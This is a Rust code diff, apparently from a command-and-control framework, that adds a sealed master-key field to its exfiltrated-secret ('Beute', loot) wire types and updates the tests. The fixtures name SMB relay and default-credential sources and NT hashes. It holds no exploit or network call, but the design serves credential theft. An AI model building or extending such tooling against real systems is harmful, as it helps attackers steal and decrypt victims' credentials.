@@ -117,6 +117,15 @@ pub struct ExfiltratedSecret {
     /// `default`, damit ein Client auch das JSON eines älteren Servers liest.
     #[serde(default)]
     pub sealed_password: String,
+    /// Der versiegelte Master-Key, mit dem dieses Stueck versiegelt wurde.
+    ///
+    /// Die Beute traegt ihren Schluessel mit: der Operator entsiegelt ihn mit
+    /// dem privaten Server-Schluessel und oeffnet die Zeile — ohne Ruecksicht
+    /// darauf, welchen Schluessel der Host-Eintrag gerade fuehrt.
+    ///
+    /// Leer, wenn der Agent ohne Server-Schluessel lief (Klartextbeute).
+    #[serde(default)]
+    pub sealed_master: String,
 }
 
 impl Host {
@@ -139,6 +148,26 @@ impl Host {
     ];
 }
 
+impl Default for ExfiltratedSecret {
+    /// Eine leere Beute — alle Felder ohne Inhalt.
+    ///
+    /// Der Typ ist ein Wire-Typ; die Vorgaabe macht das Fuellen in Tests
+    /// lesbar: `ExfiltratedSecret { host_id: .., ..Default::default() }`.
+    fn default() -> Self {
+        ExfiltratedSecret {
+            id: String::new(),
+            host_id: String::new(),
+            cred_type: String::new(),
+            username: String::new(),
+            password: String::new(),
+            source: String::new(),
+            collected_at: String::new(),
+            sealed_password: String::new(),
+            sealed_master: String::new(),
+        }
+    }
+}
+
 impl ExfiltratedSecret {
     /// Die Feldnamen des Secrets — die **einzige** Fundstelle.
     ///
@@ -152,6 +181,7 @@ impl ExfiltratedSecret {
         "source",
         "collected_at",
         "sealed_password",
+        "sealed_master",
     ];
 
     /// Setzt das Klartext-Passwort.
@@ -272,6 +302,18 @@ pub struct SecretUpload {
     /// speichert nur das Versiegelte.
     #[serde(default)]
     pub sealed_password: Option<String>,
+    /// Der versiegelte Master-Key des Hosts, mit dem dieses Stueck versiegelt
+    /// wurde (base64-kodiert).
+    ///
+    /// Der Schluessel reist **mit der Beute**: so ist jede Zeile fuer sich
+    /// lesbar, auch wenn der Host-Eintrag spaeter einen neuen Schluessel
+    /// bekommt. Ohne dieses Feld bleibt die Beute an den Schluessel des
+    /// Host-Eintrags gebunden — und der Server ersetzt diesen bei jeder
+    /// Registrierung.
+    ///
+    /// `default`, weil ein aelterer Agent es nicht sendet.
+    #[serde(default)]
+    pub sealed_master: Option<String>,
 }
 
 impl SecretUpload {
@@ -356,6 +398,7 @@ mod tests {
             source: "smb_relay".into(),
             collected_at: "2026-11-16T00:00:00Z".into(),
             sealed_password: String::new(),
+            sealed_master: String::new(),
         };
 
         let im_klartext = beute.clone().mit_passwort("hash");
@@ -379,6 +422,7 @@ mod tests {
             source: Some("smb_relay".into()),
             master_key: None,
             sealed_password: None,
+            sealed_master: None,
         };
 
         let im_klartext = upload.clone().mit_passwort("hash");
@@ -407,6 +451,7 @@ mod tests {
             source: "smb_relay".into(),
             collected_at: "2026-11-16T00:00:00Z".into(),
             sealed_password: String::new(),
+            sealed_master: String::new(),
         }
         .mit_passwort("hash");
 
@@ -425,6 +470,7 @@ mod tests {
             source: Some("smb_relay".into()),
             master_key: None,
             sealed_password: None,
+            sealed_master: None,
         }
         .mit_passwort("hash");
 
@@ -459,7 +505,8 @@ mod tests {
         "username": "Administrator",
         "password": "00000000000000000000000000000000",
         "source": "smb_relay",
-        "collected_at": "2026-11-11T00:05:00Z"
+        "collected_at": "2026-11-11T00:05:00Z",
+        "sealed_master": "platzhalter-master"
     }"#;
 
     /// Golden-JSON: die exakte Form, die der C2-Server für einen Task ausliefert.
@@ -492,7 +539,8 @@ mod tests {
         "cred_type": "nt_hash",
         "username": "Administrator",
         "password": "00000000000000000000000000000000",
-        "source": "smb_relay"
+        "source": "smb_relay",
+        "sealed_master": "platzhalter-master"
     }"#;
 
     /// Golden-JSON: die Form eines Task-Auftrags vom Operator.
@@ -605,6 +653,7 @@ mod tests {
             source: Some("default_creds".into()),
             master_key: Some("bWFzdGVy".into()),
             sealed_password: None,
+            sealed_master: None,
         };
         let wire = serde_json::to_vec(&upload).expect("serialisierbar");
         let back: SecretUpload = serde_json::from_slice(&wire).expect("deserialisierbar");
@@ -697,6 +746,7 @@ mod tests {
             source: "s".into(),
             collected_at: "c".into(),
             sealed_password: String::new(),
+            sealed_master: String::new(),
         };
         felder_sind_gepinnt(ExfiltratedSecret::FIELDS, &secret);
 
@@ -761,6 +811,7 @@ mod tests {
             source: Some("default_creds".into()),
             master_key: None,
             sealed_password: None,
+            sealed_master: None,
         };
         let wire = serde_json::to_string(&upload).expect("serialisierbar");
         let back: SecretUpload = serde_json::from_str(&wire).expect("deserialisierbar");
